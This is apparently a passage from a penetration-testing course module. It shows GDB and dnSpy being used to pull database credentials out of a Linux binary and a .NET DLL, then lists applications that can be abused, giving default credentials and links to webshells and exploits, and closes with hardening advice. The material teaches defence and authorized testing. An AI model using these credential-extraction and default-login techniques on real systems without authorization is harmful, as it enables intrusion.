There is NO WARRANTY, <span class="hljs-keyword">to</span> the extent permitted by law.
<span class="hljs-built_in">Type</span> <span class="hljs-string">"show copying"</span> <span class="hljs-built_in">and</span> <span class="hljs-string">"show warranty"</span> <span class="hljs-keyword">for</span> details.
This GDB was configured as <span class="hljs-string">"x86_64-linux-gnu"</span>.
<span class="hljs-built_in">Type</span> <span class="hljs-string">"show configuration"</span> <span class="hljs-keyword">for</span> configuration details.
<span class="hljs-keyword">For</span> bug reporting instructions, please see:
&lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/bugs/&gt;.</span>
<span class="hljs-built_in">Find</span> the GDB manual <span class="hljs-built_in">and</span> other documentation <span class="hljs-built_in">resources</span> online at:
    &lt;http:<span class="hljs-comment">//www.gnu.org/software/gdb/documentation/&gt;.</span>

<span class="hljs-keyword">For</span> help, <span class="hljs-built_in">type</span> <span class="hljs-string">"help"</span>.
<span class="hljs-built_in">Type</span> <span class="hljs-string">"apropos word"</span> <span class="hljs-keyword">to</span> search <span class="hljs-keyword">for</span> commands related <span class="hljs-keyword">to</span> <span class="hljs-string">"word"</span>...
Reading symbols <span class="hljs-keyword">from</span> ./octopus_checker...
(No debugging symbols found <span class="hljs-built_in">in</span> ./octopus_checker)
</code></pre>
<p>Once the binary is loaded, we set the <code>disassembly-flavor</code> to define the display style of the code, and we proceed with disassembling the main function of the program.</p>
<p>Code: assembly</p>
<pre><code class="lang-assembly">gdb-peda$ set disassembly-flavor intel
gdb-peda$ disas main

Dump of assembler code for function main:
   <span class="hljs-number">0x0000555555555456</span> &lt;+<span class="hljs-number">0</span>&gt;:    endbr64 
   <span class="hljs-number">0x000055555555545a</span> &lt;+<span class="hljs-number">4</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbp</span>
   <span class="hljs-number">0x000055555555545b</span> &lt;+<span class="hljs-number">5</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbp</span>,<span class="hljs-built_in">rsp</span>

 &lt;SNIP&gt;

   <span class="hljs-number">0x0000555555555625</span> &lt;+<span class="hljs-number">463</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x5555555551a0</span> &lt;_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt&gt;
   <span class="hljs-number">0x000055555555562a</span> &lt;+<span class="hljs-number">468</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>,<span class="hljs-built_in">rax</span>
   <span class="hljs-number">0x000055555555562d</span> &lt;+<span class="hljs-number">471</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rip</span>+<span class="hljs-number">0x299c</span>]        # <span class="hljs-number">0x555555557fd0</span>
   <span class="hljs-number">0x0000555555555634</span> &lt;+<span class="hljs-number">478</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rax</span>
   <span class="hljs-number">0x0000555555555637</span> &lt;+<span class="hljs-number">481</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rdx</span>
   <span class="hljs-number">0x000055555555563a</span> &lt;+<span class="hljs-number">484</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x5555555551c0</span> &lt;_ZNSolsEPFRSoS_E@plt&gt;
   <span class="hljs-number">0x000055555555563f</span> &lt;+<span class="hljs-number">489</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x4a8</span>]
   <span class="hljs-number">0x0000555555555646</span> &lt;+<span class="hljs-number">496</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x4b7</span>]
   <span class="hljs-number">0x000055555555564d</span> &lt;+<span class="hljs-number">503</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span>
   <span class="hljs-number">0x0000555555555650</span> &lt;+<span class="hljs-number">506</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x555555555220</span> &lt;_ZNSaIcEC1Ev@plt&gt;
   <span class="hljs-number">0x0000555555555655</span> &lt;+<span class="hljs-number">511</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rdx</span>,[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x4b7</span>]
   <span class="hljs-number">0x000055555555565c</span> &lt;+<span class="hljs-number">518</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x4a0</span>]
   <span class="hljs-number">0x0000555555555663</span> &lt;+<span class="hljs-number">525</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rsi</span>,[<span class="hljs-built_in">rip</span>+<span class="hljs-number">0xa34</span>]        # <span class="hljs-number">0x55555555609e</span>
   <span class="hljs-number">0x000055555555566a</span> &lt;+<span class="hljs-number">532</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span>
   <span class="hljs-number">0x000055555555566d</span> &lt;+<span class="hljs-number">535</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x5555555551f0</span> &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_@plt&gt;
   <span class="hljs-number">0x0000555555555672</span> &lt;+<span class="hljs-number">540</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x4a0</span>]
   <span class="hljs-number">0x0000555555555679</span> &lt;+<span class="hljs-number">547</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">edx</span>,<span class="hljs-number">0x2</span>
   <span class="hljs-number">0x000055555555567e</span> &lt;+<span class="hljs-number">552</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rsi</span>,<span class="hljs-built_in">rbx</span>
   <span class="hljs-number">0x0000555555555681</span> &lt;+<span class="hljs-number">555</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span>
   <span class="hljs-number">0x0000555555555684</span> &lt;+<span class="hljs-number">558</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x555555555329</span> &lt;_Z13extract_errorNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEPvs&gt;
   <span class="hljs-number">0x0000555555555689</span> &lt;+<span class="hljs-number">563</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x4a0</span>]
   <span class="hljs-number">0x0000555555555690</span> &lt;+<span class="hljs-number">570</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span>
   <span class="hljs-number">0x0000555555555693</span> &lt;+<span class="hljs-number">573</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x555555555160</span> &lt;_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@plt&gt;
   <span class="hljs-number">0x0000555555555698</span> &lt;+<span class="hljs-number">578</span>&gt;:    <span class="hljs-keyword">lea</span>    <span class="hljs-built_in">rax</span>,[<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x4b7</span>]
   <span class="hljs-number">0x000055555555569f</span> &lt;+<span class="hljs-number">585</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span>
   <span class="hljs-number">0x00005555555556a2</span> &lt;+<span class="hljs-number">588</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x5555555551d0</span> &lt;_ZNSaIcED1Ev@plt&gt;
   <span class="hljs-number">0x00005555555556a7</span> &lt;+<span class="hljs-number">593</span>&gt;:    <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">WORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x4b2</span>],<span class="hljs-number">0x0</span>

&lt;SNIP&gt;

   <span class="hljs-number">0x0000555555555761</span> &lt;+<span class="hljs-number">779</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>,<span class="hljs-built_in">QWORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x8</span>]
   <span class="hljs-number">0x0000555555555765</span> &lt;+<span class="hljs-number">783</span>&gt;:    <span class="hljs-keyword">leave</span>  
   <span class="hljs-number">0x0000555555555766</span> &lt;+<span class="hljs-number">784</span>&gt;:    <span class="hljs-keyword">ret</span>    
End of assembler dump.
</code></pre>
<p>This reveals several call instructions that point to addresses containing strings. They appear to be sections of a SQL connection string, but the sections are not in order, and the endianness entails that the string text is reversed. Endianness defines the order that the bytes are read in different architectures. Further down the function, we see a call to SQLDriverConnect.</p>
<p>Code: assembly</p>
<pre><code class="lang-assembly">   <span class="hljs-number">0x00005555555555ff</span> &lt;+<span class="hljs-number">425</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">esi</span>,<span class="hljs-number">0x0</span>
   <span class="hljs-number">0x0000555555555604</span> &lt;+<span class="hljs-number">430</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdi</span>,<span class="hljs-built_in">rax</span>
   <span class="hljs-number">0x0000555555555607</span> &lt;+<span class="hljs-number">433</span>&gt;:    <span class="hljs-keyword">call</span>   <span class="hljs-number">0x5555555551b0</span> &lt;SQLDriverConnect@plt&gt;
   <span class="hljs-number">0x000055555555560c</span> &lt;+<span class="hljs-number">438</span>&gt;:    <span class="hljs-keyword">add</span>    <span class="hljs-built_in">rsp</span>,<span class="hljs-number">0x10</span>
   <span class="hljs-number">0x0000555555555610</span> &lt;+<span class="hljs-number">442</span>&gt;:    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">WORD</span> <span class="hljs-built_in">PTR</span> [<span class="hljs-built_in">rbp</span>-<span class="hljs-number">0x4b4</span>],<span class="hljs-built_in">ax</span>
</code></pre>
<p>Adding a breakpoint at this address and running the program once again, reveals a SQL connection string in the RDX register address, containing the credentials for a local database instance.</p>
<p>Code: assembly</p>
<pre><code class="lang-assembly">gdb-peda$ b *<span class="hljs-number">0x5555555551b0</span>

Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x5555555551b0</span>


gdb-peda$ run

Starting <span class="hljs-string">program:</span> <span class="hljs-regexp">/htb/</span>rollout/octopus_checker 
[Thread debugging using libthread_db enabled]
Using host libthread_db library <span class="hljs-string">"/lib/x86_64-linux-gnu/libthread_db.so.1"</span>.
Program had started..
Attempting Connection 
[----------------------------------registers-----------------------------------]
<span class="hljs-string">RAX:</span> <span class="hljs-number">0x55555556c4f0</span> --&gt; <span class="hljs-number">0x4b5a</span> (<span class="hljs-string">'ZK'</span>)
<span class="hljs-string">RBX:</span> <span class="hljs-number">0x0</span> 
<span class="hljs-string">RCX:</span> <span class="hljs-number">0xfffffffd</span> 
<span class="hljs-string">RDX:</span> <span class="hljs-number">0x7fffffffda70</span> (<span class="hljs-string">"DRIVER={ODBC Driver 17 for SQL Server};SERVER=localhost, 1401;UID=username;PWD=password;"</span>)
<span class="hljs-string">RSI:</span> <span class="hljs-number">0x0</span> 
<span class="hljs-string">RDI:</span> <span class="hljs-number">0x55555556c4f0</span> --&gt; <span class="hljs-number">0x4b5a</span> (<span class="hljs-string">'ZK'</span>)

&lt;SNIP&gt;
</code></pre>
<p>Apart from trying to connect to the MS SQL service, penetration testers can also check if the password is reusable from users of the same network.</p>
<hr>
<h3 id="dll-file-examination">DLL File Examination</h3>
<p>A DLL file is a <code>Dynamically Linked Library</code> and it contains code that is called from other programs while they are running. The <code>MultimasterAPI.dll</code> binary is found on a remote machine during the enumeration process. Examination of the file reveals that this is a .Net assembly.</p>
<p>Attacking Applications Connecting to Services</p>
<pre><code class="lang-powershell-session">C:\&gt; Get-FileMetaData .\MultimasterAPI<span class="hljs-selector-class">.dll</span>

&lt;SNIP&gt;
M <span class="hljs-selector-class">.NETFramework</span>,Version=v4.<span class="hljs-number">6.1</span> TFrameworkDisplayName<span class="hljs-selector-class">.NET</span> Framework <span class="hljs-number">4.6</span>.<span class="hljs-number">1</span>    api/getColleagues        ! htt
<span class="hljs-selector-tag">p</span>:<span class="hljs-comment">//localhost:8081*POST         Ò^         øJ  ø,  RSDSœ»¡ÍuqœK£"Y¿bˆ   C:\Users\Hazard\Desktop\Stuff\Multimast</span>
&lt;SNIP&gt;
</code></pre>
<p>Using the debugger and .NET assembly editor <a href="https://github.com/0xd4d/dnSpy">dnSpy</a>, we can view the source code directly. This tool allows reading, editing, and debugging the source code of a .NET assembly (C# and Visual Basic). Inspection of <code>MultimasterAPI.Controllers</code> -&gt; <code>ColleagueController</code> reveals a database connection string containing the password.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/apps\_conn\_to\_services/dnspy\_hidden.png" alt="dnspy\_hidden"></p>
<p>Apart from trying to connect to the MS SQL service, attacks like password spraying can also be used to test the security of other services.</p>
<h2 id="other-notable-applications">Other Notable Applications</h2>
<hr>
<p>Though this module focuses on nine specific applications, there are still many different ones that we may encounter in the wild. I have performed large penetration tests where I ended up with an over 500-page EyeWitness report to go through.</p>
<p>The module was designed to teach a methodology that can be applied to all other applications we may encounter. The list of applications we covered in this module covers the main functions and most of the objectives of the vast number of individual applications to increase the effectiveness of your internal and external assessments during your penetration tests.</p>
<p>We covered enumerating the network and creating a visual representation of the applications within a network to ensure maximum coverage. We also covered a variety of ways that we can attack common applications, from fingerprinting and discovery to abusing built-in functionality and known public exploits. The aim of the sections on osTicket and GitLab was not only to teach you how to enumerate and attack these specific applications but also to show how support desk ticketing systems and Git repository applications may yield fruit that can be useful elsewhere during an engagement.</p>
<p>A big part of penetration testing is adapting to the unknown. Some testers may run a few scans and become discouraged when they don&#39;t see anything directly exploitable. If we can dig through our scan data and filter out all of the noise, we will often find things that scanners miss, such as a Tomcat instance with weak or default credentials or a wide-open Git repository that gives us an SSH key or password that we can use elsewhere to gain access. Having a deep understanding of the necessary methodology and mindset will make you successful, no matter if the target network has WordPress and Tomcat or a custom support ticketing system and a network monitoring system such as Nagios. Ensure that you understand the various techniques taught for footprinting these applications and the curiosity to explore an unknown application. You will come across applications not listed in this module. Similar to what I did with the Nexus Repository OSS application in the introduction section, you can apply these principles to find issues like default credentials and built-in functionality leading to remote code execution.</p>
<hr>
<h3 id="honorable-mentions">Honorable Mentions</h3>
<p>That being said, here are a few other applications that we have come across during assessments and are worth looking out for:</p>
<table><thead><tr><th width="175">Application</th><th>Abuse Info</th></tr></thead><tbody><tr><td><a href="https://axis.apache.org/axis2/java/core/">Axis2</a></td><td>This can be abused similar to Tomcat. We will often actually see it sitting on top of a Tomcat installation. If we cannot get RCE via Tomcat, it is worth checking for weak/default admin credentials on Axis2. We can then upload a <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">webshell</a> in the form of an AAR file (Axis2 service file). There is also a Metasploit <a href="https://packetstormsecurity.com/files/96224/Axis2-Upload-Exec-via-REST.html">module</a> that can assist with this.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/IBM_WebSphere_Application_Server">Websphere</a></td><td>Websphere has suffered from many different <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-14/product_id-576/cvssscoremin-9/cvssscoremax-/IBM-Websphere-Application-Server.html">vulnerabilities</a> over the years. Furthermore, if we can log in to the administrative console with default credentials such as <code>system:manager</code> we can deploy a WAR file (similar to Tomcat) and gain RCE via a web shell or reverse shell.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/Elasticsearch">Elasticsearch</a></td><td>Elasticsearch has had its fair share of vulnerabilities as well. Though old, we have seen <a href="https://www.exploit-db.com/exploits/36337">this</a> before on forgotten Elasticsearch installs during an assessment for a large enterprise (and identified within 100s of pages of EyeWitness report output). Though not realistic, the Hack The Box machine <a href="https://youtube.com/watch?v=oGO9MEIz_tI&#x26;t=54">Haystack</a> features Elasticsearch.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/Zabbix">Zabbix</a></td><td>Zabbix is an open-source system and network monitoring solution that has had quite a few <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-5667/product_id-9588/Zabbix-Zabbix.html">vulnerabilities</a> discovered such as SQL injection, authentication bypass, stored XSS, LDAP password disclosure, and remote code execution. Zabbix also has built-in functionality that can be abused to gain remote code execution. The HTB box <a href="https://youtube.com/watch?v=RLvFwiDK_F8&#x26;t=250">Zipper</a> showcases how to use the Zabbix API to gain RCE.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/Nagios">Nagios</a></td><td>Nagios is another system and network monitoring product. Nagios has had a wide variety of issues over the years, including remote code execution, root privilege escalation, SQL injection, code injection, and stored XSS. If you come across a Nagios instance, it is worth checking for the default credentials <code>nagiosadmin:PASSW0RD</code> and fingerprinting the version.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/Oracle_WebLogic_Server">WebLogic</a></td><td>WebLogic is a Java EE application server. At the time of writing, it has 190 reported <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-93/product_id-14534/Oracle-Weblogic-Server.html">CVEs</a>. There are many unauthenticated RCE exploits from 2007 up to 2021, many of which are Java Deserialization vulnerabilities.</td></tr><tr><td>Wikis/Intranets</td><td>We may come across internal Wikis (such as MediaWiki), custom intranet pages, SharePoint, etc. These are worth assessing for known vulnerabilities but also searching if there is a document repository. We have run into many intranet pages (both custom and SharePoint) that had a search functionality which led to discovering valid credentials.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/DNN_(software)">DotNetNuke</a></td><td>DotNetNuke (DNN) is an open-source CMS written in C# that uses the .NET framework. It has had a few severe <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-2486/product_id-4306/Dotnetnuke-Dotnetnuke.html">issues</a> over time, such as authentication bypass, directory traversal, stored XSS, file upload bypass, and arbitrary file download.</td></tr><tr><td><a href="https://en.wikipedia.org/wiki/VCenter">vCenter</a></td><td>vCenter is often present in large organizations to manage multiple instances of ESXi. It is worth checking for weak credentials and vulnerabilities such as this <a href="https://blog.gdssecurity.com/labs/2017/4/13/vmware-vcenter-unauthenticated-rce-using-cve-2017-5638-apach.html">Apache Struts 2 RCE</a> that scanners like Nessus do not pick up. This <a href="https://www.rapid7.com/db/modules/exploit/multi/http/vmware_vcenter_uploadova_rce/">unauthenticated OVA file upload</a> vulnerability was disclosed in early 2021, and a PoC for <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22005">CVE-2021-22005</a> was released during the development of this module. vCenter comes as both a Windows and a Linux appliance. If we get a shell on the Windows appliance, privilege escalation is relatively simple using JuicyPotato or similar. We have also seen vCenter already running as SYSTEM and even running as a domain admin! It can be a great foothold in the environment or be a single source of compromise.</td></tr></tbody></table>

<p>Once again, this is not an exhaustive list but just more examples of the many things we may come across in a corporate network. As shown here, often, a default password and built-in functionality are all we need.</p>
<h2 id="application-hardening">Application Hardening</h2>
<hr>
<p>The first step for any organization should be to create a detailed (and accurate) application inventory of both internal and external-facing applications. This can be achieved in many ways, and blue teams on a budget could benefit from pentesting tools such as Nmap and EyeWitness to assist in the process. Various open-source and paid tools can be used to create and maintain this inventory. Without knowing what exists in the environment, we won&#39;t know what to protect! Creating this inventory may expose instances of &quot;shadow IT&quot; (or unauthorized installs), deprecated applications that are no longer needed, or even issues such as a trial version of a tool being converted to a free version automatically (such as Splunk when it no longer requires authentication).</p>
<hr>
<h3 id="general-hardening-tips">General Hardening Tips</h3>
<p>The applications discussed in this section should be hardened to prevent compromise using these techniques and others. Below are some important measures that can help secure deployments of WordPress, Drupal, Joomla, Tomcat, Jenkins, osTicket, GitLab, PRTG Network Monitor, and Splunk in any environment.</p>
<ul>
<li><code>Secure authentication</code>: Applications should enforce strong passwords during registration and setup, and default administrative account passwords should be changed. If possible, the default administrative accounts should be disabled, with new custom administrative accounts created. Some applications inherently support 2FA authentication, which should be made mandatory for at least administrator-level users.</li>
<li><code>Access controls</code>: Proper access control mechanisms should be implemented per application. For example, login pages should not be accessible from the external network unless there is a valid business reason for this access. Similarly, file and folder permissions can be configured to deny uploads or application deployments.</li>
<li><code>Disable unsafe features</code>: Features such as PHP code editing in WordPress can be disabled to prevent code execution if the server is compromised.</li>
<li><code>Regular updates</code>: Applications should be updated regularly, and patches supplied by vendors should be applied as soon as possible.</li>
<li><code>Backups</code>: System administrators should always configure website and database backups, allowing the application to be quickly restored in case of a compromise.</li>
<li><code>Security monitoring</code>: There are various tools and plugins that can be used to monitor the status and various security-related issues for our applications. Another option is a Web Application Firewall (WAF). While not a silver bullet, a WAF can help add an extra layer of protection provided all the measures above have already been taken.</li>
<li><code>LDAP integration with Active Directory</code>: Integrating applications with Active Directory single sign-on can increase ease of access, provide more auditing functionality (especially if synced with Azure), and make managing credentials and service accounts more streamlined. It also decreases the number of accounts and passwords that a user will have to remember and give fine-grained control over the password policy.</li>
</ul>
<p>Every application that we discussed in this module (and beyond) should be following key hardening guidelines such as enabling multi-factor authentication for admins and users wherever possible, changing default admin user account names, limiting the number of admins, and how admins can access the site (i.e., not from the open internet), enforce the principle of least privilege throughout the application, perform regular updates to address security vulnerabilities, taking regular backups to a secondary location to be able to recover quickly in the event of an attack and implement security monitoring tools that can detect and block malicious activity and account brute-forcing, among other attacks.</p>
<p>Finally, we should be careful with what we expose to the internet. Does that GitLab repo really need to be public? Does our ticketing system need to be accessible outside the internal network? With these controls in place, we will have a solid baseline to apply to all applications regardless of their function.</p>
<p>We should also perform regular checks and updates to our application inventory to ensure that we are not exposing applications on the internal or external network that are no longer needed or have severe security flaws. Finally, perform regular assessments to look for security vulnerabilities and misconfigurations as well as sensitive data exposure. Follow through on remediation recommendations included in your penetration testing reports and periodically check for the same types of flaws discovered by your penetration testers. Some could be process-related, requiring a mindset shift for the organization to become more security conscious.</p>
<hr>
<h3 id="application-specific-hardening-tips">Application-Specific Hardening Tips</h3>
<p>Though the general concepts for application hardening apply to all applications that we discussed in this module and will encounter in the real world, we can take some more specific measures. Here are a few:</p>
<table><thead><tr><th width="164">Application</th><th width="207">Hardening Category</th><th>Discussion</th></tr></thead><tbody><tr><td><a href="https://wordpress.org/support/article/hardening-wordpress/">WordPress</a></td><td>Security monitoring</td><td>Use a security plugin such as <a href="https://www.wordfence.com/">WordFence</a> which includes security monitoring, blocking of suspicious activity, country blocking, two-factor authentication, and more</td></tr><tr><td><a href="https://docs.joomla.org/Security_Checklist/Joomla!_Setup">Joomla</a></td><td>Access controls</td><td>A plugin such as <a href="https://extensions.joomla.org/extension/adminexile/">AdminExile</a> can be used to require a secret key to log in to the Joomla admin page such as <code><a href="http://joomla.inlanefreight.local/administrator?thisismysecretkey">http://joomla.inlanefreight.local/administrator?thisismysecretkey</a></code></td></tr><tr><td><a href="https://www.drupal.org/docs/security-in-drupal">Drupal</a></td><td>Access controls</td><td>Disable, hide, or move the <a href="https://www.drupal.org/docs/7/managing-users/hide-user-login">admin login page</a></td></tr><tr><td><a href="https://tomcat.apache.org/tomcat-9.0-doc/security-howto.html">Tomcat</a></td><td>Access controls</td><td>Limit access to the Tomcat Manager and Host-Manager applications to only localhost. If these must be exposed externally, enforce IP whitelisting and set a very strong password and non-standard username.</td></tr><tr><td><a href="https://www.jenkins.io/doc/book/security/securing-jenkins/">Jenkins</a></td><td>Access controls</td><td>Configure permissions using the <a href="https://plugins.jenkins.io/matrix-auth">Matrix Authorization Strategy plugin</a></td></tr><tr><td><a href="https://docs.splunk.com/Documentation/Splunk/8.2.2/Security/Hardeningstandards">Splunk</a></td><td>Regular updates</td><td>Make sure to change the default password and ensure that Splunk is properly licensed to enforce authentication</td></tr><tr><td><a href="https://kb.paessler.com/en/topic/61108-what-security-features-does-prtg-include">PRTG Network Monitor</a></td><td>Secure authentication</td><td>Make sure to stay up-to-date and change the default PRTG password</td></tr><tr><td>osTicket</td><td>Access controls</td><td>Limit access from the internet if possible</td></tr><tr><td><a href="https://about.gitlab.com/blog/2020/05/20/gitlab-instance-security-best-practices/">GitLab</a></td><td>Secure authentication</td><td>Enforce sign-up restrictions such as requiring admin approval for new sign-ups, configuring allowed and denied domains</td></tr></tbody></table>

<hr>
<h3 id="conclusion">Conclusion</h3>
<p>In this module, we covered a critical area of penetration testing: common applications. Web applications present an enormous attack surface and often go overlooked. During an external penetration test, often, the majority of our targets are applications. We must understand how to discover applications (and organize our scan data to process it efficiently), footprint versions, discover known vulnerabilities, and leverage built-in functionality. Many organizations do well with patching and vulnerability management but often overlook issues such as weak credentials to access Tomcat Manager or a printer with default credentials for the web management application where we can obtain LDAP credentials to use as a foothold into the internal network. The three skills assessments that follow are meant to put the application discovery and enumeration process to the test.</p>
